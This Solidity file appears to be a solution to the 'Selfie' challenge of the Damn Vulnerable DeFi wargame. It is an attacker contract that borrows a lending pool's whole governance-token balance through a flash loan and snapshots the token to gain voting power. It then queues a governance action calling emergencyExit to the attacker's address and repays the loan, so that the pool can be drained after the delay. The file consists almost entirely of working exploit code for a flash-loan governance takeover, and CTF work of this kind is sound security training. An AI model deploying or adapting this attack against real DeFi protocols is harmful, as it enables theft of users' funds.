// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256 lastSnapshotId);
}

interface ISimpleGovernance {
    function queueAction(
        address target,
        uint128 value,
        bytes calldata data
    ) external returns (uint256 actionId);

    function executeAction(
        uint256 actionId
    ) external payable returns (bytes memory);
}

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

contract Attack {
    ISelfiePool public immutable pool;
    address public immutable token;
    ISimpleGovernance public immutable governance;
    uint256 actionId;

    constructor(
        ISelfiePool _pool,
        address _token,
        ISimpleGovernance _governance
    ) {
        pool = _pool;
        token = _token;
        governance = _governance;
    }

    function attackPhase1() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            msg.sender
        );

        uint256 balance = IERC20(token).balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            token,
            balance,
            data
        );
    }

    function attackPhase2() external {
        // * after delay
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address /*initiator*/,
        address _token,
        uint256 amount,
        uint256 /*fee*/,
        bytes calldata data
    ) external returns (bytes32) {
        IDamnValuableTokenSnapshot(_token).snapshot();
        actionId = governance.queueAction(address(pool), 0, data);

        IERC20(_token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
